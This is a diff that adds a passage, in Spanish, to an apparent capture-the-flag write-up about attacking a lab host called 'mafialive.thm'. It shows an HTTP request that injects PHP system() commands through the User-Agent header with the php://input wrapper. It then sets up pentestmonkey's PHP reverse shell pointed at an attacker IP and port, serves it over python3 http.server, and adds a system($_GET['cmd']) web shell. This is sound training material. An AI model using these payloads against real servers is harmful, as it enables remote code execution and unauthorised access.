@@ -104,8 +104,20 @@ Para no ir enumerando archivo por archivo de manera manual como se ha hecho con 
 
 ![Captura de pantalla 2025-04-24 155849](https://github.com/user-attachments/assets/df9d794f-630e-470f-9be5-cf3cd2e20442)
 
+Así pues, con la ayuda del *wrapper* 'php://input', se pueden meter comandos en el campo *User-Agent* mediante la función de ejecución de programa *system(**comando**)* de *PHP*. De manera que la dirección web ‘/var/log/apache2/acces.log’ lo interprete y ejecute. Como prueba, se listan los archivos que contenga el directorio '/var/www/html/development_testing/' y para ver con más claridad el *log* se puede ver la vista del código fuente, donde efectivamente se muestran los diferentes archivos.
+
 <code>GET /test.php?view=php://input HTTP/1.1  
 Host: mafialive.thm  
-User-Agent: Mozilla/5.0 <?php system('ls -la'); ?> Gecko/20100101 Firefox/136.0</code>
+User-Agent: Mozilla/5.0 < ?php system('ls -la'); ? > Gecko/20100101 Firefox/136.0</code>
 
+![Captura de pantalla 2025-04-24 161350](https://github.com/user-attachments/assets/cd1b236b-f0b6-4b8f-a07f-d9cdce43cf72)
+
+Puesto que ir haciendo esto para cada comando que se quiera lanzar es un engorro, se subirá un archivo con una *reverse shell* a este directorio para después ejecutarlo desde este y tener acceso a la máquina. La *reverse shell* es descargada de la página de *Github* de [pentestmonkeys](https://github.com/pentestmonkey/php-reverse-shell) y se debe adecuar a la IP y puerto de la máquina atacante que escucha. Sólo es necesario modificar las variables $ip (10.23.92.113) y $port (1234). Por un lado se crea un servidor con *Python3* como se ha hecho en otros CTF desde la carpeta donde se almacena el archivo con la *reverse*.
+
+<code>python3 -m http.server 8000</code>
+
+Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra de la *URL* se pueda indicar el comando a lanzar. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente.
+
+ <code>system($_GET['cmd'])</code>
+ 
 **Flag:**
